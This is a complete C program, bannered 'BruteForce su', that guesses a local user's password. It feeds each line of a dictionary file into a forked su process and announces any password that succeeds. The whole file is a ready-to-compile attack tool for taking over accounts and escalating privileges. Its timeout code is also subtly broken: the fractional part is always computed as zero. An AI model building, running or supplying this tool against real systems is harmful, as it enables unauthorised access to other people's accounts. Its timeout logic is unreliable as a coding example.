#include <fcntl.h>
#include <signal.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

double timeout_s = 1.0;

const char *escGreen = "\033[1;32m",
	*escBlue = "\033[1;34m",
	*escReset = "\033[0m";

void printHelp(const char *progname) {
	printf("Usage: %s user dictionary [timeout] ...\n"
		"You must specify both the username and the dictionary file.\n"
		"Optionally, you can specify a timeout in seconds (e.g., 0.1).\n",
		progname);
	exit(1);
}

void printBanner(void) {
	printf("%s\n"
		"******************************\n"
		"*       BruteForce su        *\n"
		"******************************\n%s\n",
		escBlue, escReset);
}

int checkPass(const char *password, const char *user) {
	int pipefd[2];
	pid_t pid;

	if (pipe(pipefd) == -1 || (pid = fork()) == -1) {
		perror("Error in pipe or fork");
		return 0;
	}

	if (pid == 0) {
		close(pipefd[1]);

		int fd = open("/dev/null", O_WRONLY);
		bool err_in = (dup2(pipefd[0], STDIN_FILENO) == -1);
		bool err_out = (fd < 0 || dup2(fd, STDERR_FILENO) == -1);
		close(fd);

		if (err_in || err_out) {
			perror("Error in input or output redirection");
			exit(1);
		}

		execlp("su", "su", user, (char *)NULL);
		perror("execlp");
		exit(1);
	}

	close(pipefd[0]);
	write(pipefd[1], password, strlen(password));
	write(pipefd[1], "\n", 1);
	close(pipefd[1]);

	struct timespec ts = {
		.tv_sec = (int)timeout_s,
		.tv_nsec = (long)((timeout_s - timeout_s) * 1e9),
	};

	nanosleep(&ts, NULL);

	int status;

	if (waitpid(pid, &status, WNOHANG) == 0) {
		kill(pid, SIGKILL);
		waitpid(pid, &status, 0);
		return 0;
	}

	return WIFEXITED(status) && WEXITSTATUS(status) == 0;
}

void bruteForce(const char *dictionary, const char *user) {
	FILE *file = fopen(dictionary, "r");

	if (!file) {
		perror("Error opening the file");
		exit(1);
	}

	char *line = NULL;
	size_t len = 0;

	while (getline(&line, &len, file) != -1) {
		line[strcspn(line, "\n")] = 0;

		printf("Trying password: %s\n", line);

		if (checkPass(line, user)) {
			printf("%sPassword found for user %s: %s%s\n",
				escGreen, user, line, escReset);
			break;
		}
	}

	free(line);
	fclose(file);
}

int main(int argc, char *argv[]) {
	if (argc < 3) {
		printHelp(argv[0]);
	}

	printBanner();

	const char *user = argv[1], *dictionary = argv[2];

	if (argc >= 4) {
		timeout_s = atof(argv[3]);
		if (timeout_s <= 0) {
			fputs("Invalid timeout value. Using default: 1.0s\n", stderr);
			timeout_s = 1.0;
		}
	}

	bruteForce(dictionary, user);
	return 0;
}
